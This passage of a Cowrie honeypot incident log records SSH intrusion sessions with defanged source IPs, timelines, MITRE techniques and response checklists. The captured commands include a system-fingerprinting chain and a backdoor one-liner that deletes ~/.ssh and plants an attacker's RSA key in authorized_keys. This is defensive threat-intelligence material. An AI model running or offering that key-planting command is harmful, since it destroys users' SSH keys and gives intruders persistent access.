| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 07:42:35` | `cowrie.session.connect` |
| `2026-07-11 07:42:35` | `cowrie.client.version` |
| `2026-07-11 07:42:35` | `cowrie.client.kex` |
| `2026-07-11 07:42:36` | `cowrie.login.success` |
| `2026-07-11 07:42:37` | `cowrie.session.params` |
| `2026-07-11 07:42:37` | `cowrie.command.input` |
| `2026-07-11 07:42:37` | `cowrie.command.input` |
| `2026-07-11 07:42:37` | `cowrie.command.input` |
| `2026-07-11 07:42:38` | `cowrie.command.input` |
| `2026-07-11 07:42:38` | `cowrie.command.input` |
| `2026-07-11 07:42:38` | `cowrie.command.success` |
| `2026-07-11 07:42:38` | `cowrie.command.input` |
| `2026-07-11 07:42:38` | `cowrie.command.input` |
| `2026-07-11 07:42:38` | `cowrie.command.input` |
| `2026-07-11 07:42:38` | `cowrie.command.input` |
| `2026-07-11 07:42:38` | `cowrie.log.closed` |
| `2026-07-11 07:42:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]233` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]233` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f4a2aad4bba4

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]233` |
| **First Seen** | 2026-07-11 07:44 |
| **Last Seen** | 2026-07-11 07:44 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 07:44:12` | `cowrie.session.connect` |
| `2026-07-11 07:44:13` | `cowrie.client.version` |
| `2026-07-11 07:44:13` | `cowrie.client.kex` |
| `2026-07-11 07:44:14` | `cowrie.login.success` |
| `2026-07-11 07:44:15` | `cowrie.session.params` |
| `2026-07-11 07:44:15` | `cowrie.command.input` |
| `2026-07-11 07:44:15` | `cowrie.command.input` |
| `2026-07-11 07:44:15` | `cowrie.command.input` |
| `2026-07-11 07:44:15` | `cowrie.command.input` |
| `2026-07-11 07:44:15` | `cowrie.command.input` |
| `2026-07-11 07:44:15` | `cowrie.command.success` |
| `2026-07-11 07:44:15` | `cowrie.command.input` |
| `2026-07-11 07:44:15` | `cowrie.command.input` |
| `2026-07-11 07:44:15` | `cowrie.command.input` |
| `2026-07-11 07:44:15` | `cowrie.command.input` |
| `2026-07-11 07:44:16` | `cowrie.log.closed` |
| `2026-07-11 07:44:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]233` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]233` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-182e99962b06

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]233` |
| **First Seen** | 2026-07-11 07:45 |
| **Last Seen** | 2026-07-11 07:45 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 07:45:49` | `cowrie.session.connect` |
| `2026-07-11 07:45:49` | `cowrie.client.version` |
| `2026-07-11 07:45:49` | `cowrie.client.kex` |
| `2026-07-11 07:45:51` | `cowrie.login.success` |
| `2026-07-11 07:45:52` | `cowrie.session.params` |
| `2026-07-11 07:45:52` | `cowrie.command.input` |
| `2026-07-11 07:45:52` | `cowrie.command.input` |
| `2026-07-11 07:45:52` | `cowrie.command.input` |
| `2026-07-11 07:45:52` | `cowrie.command.input` |
| `2026-07-11 07:45:52` | `cowrie.command.input` |
| `2026-07-11 07:45:52` | `cowrie.command.success` |
| `2026-07-11 07:45:52` | `cowrie.command.input` |
| `2026-07-11 07:45:52` | `cowrie.command.input` |
| `2026-07-11 07:45:52` | `cowrie.command.input` |
| `2026-07-11 07:45:52` | `cowrie.command.input` |
| `2026-07-11 07:45:52` | `cowrie.log.closed` |
| `2026-07-11 07:45:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]233` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]233` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ca58be4f0aa4

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]233` |
| **First Seen** | 2026-07-11 07:47 |
| **Last Seen** | 2026-07-11 07:47 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 07:47:27` | `cowrie.session.connect` |
| `2026-07-11 07:47:27` | `cowrie.client.version` |
| `2026-07-11 07:47:27` | `cowrie.client.kex` |
| `2026-07-11 07:47:28` | `cowrie.login.success` |
| `2026-07-11 07:47:30` | `cowrie.session.params` |
| `2026-07-11 07:47:30` | `cowrie.command.input` |
| `2026-07-11 07:47:30` | `cowrie.command.input` |
| `2026-07-11 07:47:30` | `cowrie.command.input` |
| `2026-07-11 07:47:30` | `cowrie.command.input` |
| `2026-07-11 07:47:30` | `cowrie.command.input` |
| `2026-07-11 07:47:30` | `cowrie.command.success` |
| `2026-07-11 07:47:30` | `cowrie.command.input` |
| `2026-07-11 07:47:30` | `cowrie.command.input` |
| `2026-07-11 07:47:30` | `cowrie.command.input` |
| `2026-07-11 07:47:30` | `cowrie.command.input` |
| `2026-07-11 07:47:30` | `cowrie.log.closed` |
| `2026-07-11 07:47:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]233` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]233` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-26cdf85eb944

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]233` |
| **First Seen** | 2026-07-11 07:48 |
| **Last Seen** | 2026-07-11 07:49 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 07:48:59` | `cowrie.session.connect` |
| `2026-07-11 07:48:59` | `cowrie.client.version` |
| `2026-07-11 07:48:59` | `cowrie.client.kex` |
| `2026-07-11 07:49:00` | `cowrie.login.success` |
| `2026-07-11 07:49:02` | `cowrie.session.params` |
| `2026-07-11 07:49:02` | `cowrie.command.input` |
| `2026-07-11 07:49:02` | `cowrie.command.input` |
| `2026-07-11 07:49:02` | `cowrie.command.input` |
| `2026-07-11 07:49:02` | `cowrie.command.input` |
| `2026-07-11 07:49:02` | `cowrie.command.input` |
| `2026-07-11 07:49:02` | `cowrie.command.success` |
| `2026-07-11 07:49:02` | `cowrie.command.input` |
| `2026-07-11 07:49:02` | `cowrie.command.input` |
| `2026-07-11 07:49:02` | `cowrie.command.input` |
| `2026-07-11 07:49:02` | `cowrie.command.input` |
| `2026-07-11 07:49:02` | `cowrie.log.closed` |
| `2026-07-11 07:49:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]233` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]233` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d9d56bade2fb

| Field | Detail |
|---|---|
| **Source IP** | `34.14.122[.]221` |
| **First Seen** | 2026-07-11 07:49 |
| **Last Seen** | 2026-07-11 07:49 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 07:49:16` | `cowrie.session.connect` |
| `2026-07-11 07:49:16` | `cowrie.client.version` |
| `2026-07-11 07:49:16` | `cowrie.client.kex` |
| `2026-07-11 07:49:16` | `cowrie.login.success` |
| `2026-07-11 07:49:17` | `cowrie.session.params` |
| `2026-07-11 07:49:17` | `cowrie.command.input` |
| `2026-07-11 07:49:17` | `cowrie.command.failed` |
| `2026-07-11 07:49:17` | `cowrie.log.closed` |
| `2026-07-11 07:49:18` | `cowrie.session.params` |
| `2026-07-11 07:49:18` | `cowrie.command.input` |
| `2026-07-11 07:49:18` | `cowrie.session.file_download` |
| `2026-07-11 07:49:18` | `cowrie.log.closed` |
| `2026-07-11 07:49:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.14.122[.]221` to AbuseIPDB if not already reported
- [ ] Block `34.14.122[.]221` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-707cffafaea8

| Field | Detail |
|---|---|
| **Source IP** | `34.14.122[.]221` |
| **First Seen** | 2026-07-11 07:49 |
| **Last Seen** | 2026-07-11 07:49 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 07:49:18` | `cowrie.session.connect` |
| `2026-07-11 07:49:18` | `cowrie.client.version` |
| `2026-07-11 07:49:18` | `cowrie.client.kex` |
| `2026-07-11 07:49:18` | `cowrie.login.success` |
| `2026-07-11 07:49:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.14.122[.]221` to AbuseIPDB if not already reported
- [ ] Block `34.14.122[.]221` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ae062bb4c3cb

| Field | Detail |
|---|---|
| **Source IP** | `34.14.122[.]221` |
| **First Seen** | 2026-07-11 07:49 |
| **Last Seen** | 2026-07-11 07:49 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 07:49:19` | `cowrie.session.connect` |
| `2026-07-11 07:49:19` | `cowrie.client.version` |
| `2026-07-11 07:49:19` | `cowrie.client.kex` |
| `2026-07-11 07:49:19` | `cowrie.login.success` |
| `2026-07-11 07:49:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.14.122[.]221` to AbuseIPDB if not already reported
- [ ] Block `34.14.122[.]221` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0beca1ffaf9f

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-11 07:49 |
| **Last Seen** | 2026-07-11 07:49 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 07:49:31` | `cowrie.session.connect` |
| `2026-07-11 07:49:32` | `cowrie.client.version` |
| `2026-07-11 07:49:32` | `cowrie.client.kex` |
| `2026-07-11 07:49:34` | `cowrie.login.success` |
| `2026-07-11 07:49:35` | `cowrie.session.params` |
| `2026-07-11 07:49:35` | `cowrie.command.input` |
| `2026-07-11 07:49:36` | `cowrie.log.closed` |
| `2026-07-11 07:49:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cd56caf0682a

| Field | Detail |
|---|---|
| **Source IP** | `64.89.161[.]91` |
| **First Seen** | 2026-07-11 07:50 |
| **Last Seen** | 2026-07-11 07:50 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 07:50:03` | `cowrie.session.connect` |
| `2026-07-11 07:50:03` | `cowrie.client.version` |
| `2026-07-11 07:50:03` | `cowrie.client.kex` |
| `2026-07-11 07:50:03` | `cowrie.login.success` |
| `2026-07-11 07:50:03` | `cowrie.direct-tcpip.request` |
| `2026-07-11 07:50:04` | `cowrie.direct-tcpip.data` |
| `2026-07-11 07:50:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.89.161[.]91` to AbuseIPDB if not already reported
- [ ] Block `64.89.161[.]91` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6082d88b2867

| Field | Detail |
|---|---|
| **Source IP** | `64.89.161[.]91` |
| **First Seen** | 2026-07-11 07:50 |
| **Last Seen** | 2026-07-11 07:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 07:50:14` | `cowrie.session.connect` |
| `2026-07-11 07:50:14` | `cowrie.client.version` |
| `2026-07-11 07:50:14` | `cowrie.client.kex` |
| `2026-07-11 07:50:14` | `cowrie.login.success` |
| `2026-07-11 07:50:14` | `cowrie.direct-tcpip.request` |
| `2026-07-11 07:50:14` | `cowrie.direct-tcpip.data` |
| `2026-07-11 07:50:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.89.161[.]91` to AbuseIPDB if not already reported
- [ ] Block `64.89.161[.]91` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cc8fb2c9c8d0

| Field | Detail |
|---|---|
| **Source IP** | `64.89.161[.]91` |
| **First Seen** | 2026-07-11 07:50 |
| **Last Seen** | 2026-07-11 07:50 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 07:50:23` | `cowrie.session.connect` |
| `2026-07-11 07:50:23` | `cowrie.client.version` |
| `2026-07-11 07:50:23` | `cowrie.client.kex` |
| `2026-07-11 07:50:24` | `cowrie.login.success` |
| `2026-07-11 07:50:24` | `cowrie.direct-tcpip.request` |
| `2026-07-11 07:50:24` | `cowrie.direct-tcpip.data` |
| `2026-07-11 07:50:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.89.161[.]91` to AbuseIPDB if not already reported
- [ ] Block `64.89.161[.]91` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8256a78e7565

| Field | Detail |
|---|---|
| **Source IP** | `64.89.161[.]91` |
| **First Seen** | 2026-07-11 07:50 |
| **Last Seen** | 2026-07-11 07:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 07:50:30` | `cowrie.session.connect` |
| `2026-07-11 07:50:30` | `cowrie.client.version` |
| `2026-07-11 07:50:30` | `cowrie.client.kex` |
| `2026-07-11 07:50:31` | `cowrie.login.success` |
| `2026-07-11 07:50:31` | `cowrie.direct-tcpip.request` |
| `2026-07-11 07:50:31` | `cowrie.direct-tcpip.data` |
| `2026-07-11 07:50:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.89.161[.]91` to AbuseIPDB if not already reported
- [ ] Block `64.89.161[.]91` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d093834ac676

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]233` |
| **First Seen** | 2026-07-11 07:50 |
| **Last Seen** | 2026-07-11 07:50 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 07:50:33` | `cowrie.session.connect` |
| `2026-07-11 07:50:33` | `cowrie.client.version` |
| `2026-07-11 07:50:33` | `cowrie.client.kex` |
| `2026-07-11 07:50:35` | `cowrie.login.success` |
| `2026-07-11 07:50:37` | `cowrie.session.params` |
| `2026-07-11 07:50:37` | `cowrie.command.input` |
| `2026-07-11 07:50:37` | `cowrie.command.input` |
| `2026-07-11 07:50:37` | `cowrie.command.input` |
| `2026-07-11 07:50:37` | `cowrie.command.input` |
| `2026-07-11 07:50:37` | `cowrie.command.input` |
| `2026-07-11 07:50:37` | `cowrie.command.success` |
| `2026-07-11 07:50:37` | `cowrie.command.input` |
| `2026-07-11 07:50:37` | `cowrie.command.input` |
| `2026-07-11 07:50:37` | `cowrie.command.input` |
| `2026-07-11 07:50:37` | `cowrie.command.input` |
| `2026-07-11 07:50:37` | `cowrie.log.closed` |
| `2026-07-11 07:50:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]233` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]233` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-983edd0baa19

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]233` |
| **First Seen** | 2026-07-11 07:52 |
| **Last Seen** | 2026-07-11 07:52 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 07:52:08` | `cowrie.session.connect` |
| `2026-07-11 07:52:09` | `cowrie.client.version` |
| `2026-07-11 07:52:09` | `cowrie.client.kex` |
| `2026-07-11 07:52:11` | `cowrie.login.success` |
| `2026-07-11 07:52:12` | `cowrie.session.params` |
| `2026-07-11 07:52:12` | `cowrie.command.input` |
| `2026-07-11 07:52:12` | `cowrie.command.input` |
| `2026-07-11 07:52:12` | `cowrie.command.input` |
| `2026-07-11 07:52:12` | `cowrie.command.input` |
| `2026-07-11 07:52:12` | `cowrie.command.input` |
| `2026-07-11 07:52:12` | `cowrie.command.success` |
| `2026-07-11 07:52:12` | `cowrie.command.input` |
| `2026-07-11 07:52:12` | `cowrie.command.input` |
| `2026-07-11 07:52:12` | `cowrie.command.input` |
| `2026-07-11 07:52:12` | `cowrie.command.input` |
| `2026-07-11 07:52:13` | `cowrie.log.closed` |
| `2026-07-11 07:52:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]233` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]233` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7ed1c8acad91

| Field | Detail |
|---|---|
| **Source IP** | `95.90.13[.]168` |
| **First Seen** | 2026-07-11 07:52 |
| **Last Seen** | 2026-07-11 07:52 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 07:52:19` | `cowrie.session.connect` |
| `2026-07-11 07:52:19` | `cowrie.client.version` |
| `2026-07-11 07:52:20` | `cowrie.client.kex` |
| `2026-07-11 07:52:20` | `cowrie.login.success` |
| `2026-07-11 07:52:21` | `cowrie.session.params` |
| `2026-07-11 07:52:21` | `cowrie.command.input` |
| `2026-07-11 07:52:21` | `cowrie.command.failed` |
| `2026-07-11 07:52:21` | `cowrie.log.closed` |
| `2026-07-11 07:52:22` | `cowrie.session.params` |
| `2026-07-11 07:52:22` | `cowrie.command.input` |
| `2026-07-11 07:52:22` | `cowrie.session.file_download` |
| `2026-07-11 07:52:22` | `cowrie.log.closed` |
| `2026-07-11 07:52:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `95.90.13[.]168` to AbuseIPDB if not already reported
- [ ] Block `95.90.13[.]168` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6f6b85e4c5cc

| Field | Detail |
|---|---|
| **Source IP** | `95.90.13[.]168` |
| **First Seen** | 2026-07-11 07:52 |
| **Last Seen** | 2026-07-11 07:52 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 07:52:22` | `cowrie.session.connect` |
| `2026-07-11 07:52:22` | `cowrie.client.version` |
| `2026-07-11 07:52:22` | `cowrie.client.kex` |
| `2026-07-11 07:52:23` | `cowrie.login.success` |
